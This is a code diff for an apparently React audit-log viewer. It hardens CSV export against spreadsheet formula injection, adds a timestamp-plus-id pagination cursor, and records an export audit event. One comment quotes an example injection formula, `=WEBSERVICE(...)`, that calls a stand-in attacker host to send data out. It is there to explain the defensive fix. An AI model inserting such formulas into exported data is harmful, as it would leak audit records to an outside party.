@@ -120,9 +120,17 @@ function formatTarget(target, metadata) {
 }
 
 // CSV-escape con BOM para que Excel reconozca UTF-8 y acentos se vean bien.
+// Además, prefijamos con apóstrofe las celdas que arrancan con caracteres que
+// Excel/Sheets interpretan como inicio de fórmula (=, +, -, @, TAB, CR). El
+// metadata de auditoría captura datos parcialmente controlados por usuarios
+// externos (userAgent en token.rejected, vendor names en prompt_injection,
+// emails), así que un valor tipo `=WEBSERVICE("http://attacker/?x="&A2)` podría
+// exfiltrar audit data al abrir el CSV. El apóstrofe lo neutraliza sin perder
+// el contenido — Excel lo muestra como texto literal.
 function csvEscape(v) {
   if (v == null) return '';
-  const s = String(v);
+  let s = String(v);
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
   if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
 }
@@ -251,12 +259,17 @@ function AuditEvents() {
   // así no renderizamos resultados que no corresponden al filtro activo.
   const reqSeq = useRef(0);
 
-  const requestPage = useCallback(({ cursor, append }) => {
+  const requestPage = useCallback(({ cursor, cursorId, append }) => {
     const seq = ++reqSeq.current;
     if (append) setLoadingMore(true); else setLoading(true);
 
     const params = new URLSearchParams(queryString);
+    // Cursor compuesto: timestamp + docId. Solo-timestamp pierde eventos
+    // adyacentes cuando dos comparten el mismo milisegundo (raro pero real:
+    // batch writes, cron). El backend usa el docId para romper el empate vía
+    // DocumentSnapshot.startAfter.
     if (cursor) params.set('after', cursor);
+    if (cursorId) params.set('afterId', cursorId);
 
     apiFetch(`/api/audit/events?${params.toString()}`)
       .then(async r => {
@@ -302,13 +315,13 @@ function AuditEvents() {
       });
   }, [apiFetch, queryString, limit]);
 
-  const fetchEvents = useCallback(() => requestPage({ cursor: null, append: false }), [requestPage]);
+  const fetchEvents = useCallback(() => requestPage({ cursor: null, cursorId: null, append: false }), [requestPage]);
   const loadMore = useCallback(() => {
-    // El cursor es el timestamp del último evento ya cargado (estamos ordenados
-    // desc; startAfter en backend toma valores menores que el cursor).
+    // El cursor es el (timestamp, id) del último evento ya cargado. El id rompe
+    // empates cuando dos eventos comparten timestamp al milisegundo.
     const last = events[events.length - 1];
-    if (!last?.timestamp) return;
-    requestPage({ cursor: last.timestamp, append: true });
+    if (!last?.timestamp || !last?.id) return;
+    requestPage({ cursor: last.timestamp, cursorId: last.id, append: true });
   }, [events, requestPage]);
 
   useEffect(() => { fetchEvents(); }, [fetchEvents]);
@@ -351,6 +364,32 @@ function AuditEvents() {
   });
   const expandAll   = () => setExpanded(new Set(events.map(e => e.id)));
   const collapseAll = () => setExpanded(new Set());
+
+  // Notifica al backend que un admin exfiltró el log antes de generar el CSV.
+  // El backend escribe un evento `audit.export` con los filtros activos y el
+  // conteo de filas. Best-effort: si la red falla o el backend rechaza, el CSV
+  // igual se descarga — no bloqueamos UX por audit observability, que es
+  // fail-open en todo el sistema. El `await` con catch silencioso permite
+  // serializar la llamada antes del download sin propagar errores al usuario.
+  const handleExport = useCallback(async () => {
+    try {
+      await apiFetch('/api/audit/exports', {
+        method: 'POST',
+        body: JSON.stringify({
+          count: events.length,
+          filters: {
+            action: filterAction || null,
+            severity: filterSeverity || null,
+            since: filterSince ? dayStartIso(filterSince) : null,
+            until: filterUntil ? dayEndIso(filterUntil) : null,
+          },
+        }),
+      });
+    } catch {
+      // Best-effort. Audit fail-open por diseño.
+    }
+    exportEventsAsCsv(events);
+  }, [apiFetch, events, filterAction, filterSeverity, filterSince, filterUntil]);
 
   // hasFilters NO incluye el límite: cambiar el límite no filtra, solo dice
   // cuántos mostrar. Antes contaba como filtro y disparaba el mensaje "Ningún
@@ -543,7 +582,7 @@ function AuditEvents() {
           <button
             type="button"
             className="aur-btn-pill aur-btn-pill--sm"
-            onClick={() => exportEventsAsCsv(events)}
+            onClick={handleExport}
             disabled={!canExport}
             title={canExport ? `Exportar ${eventsCount} eventos a CSV` : 'No hay eventos para exportar'}
           >
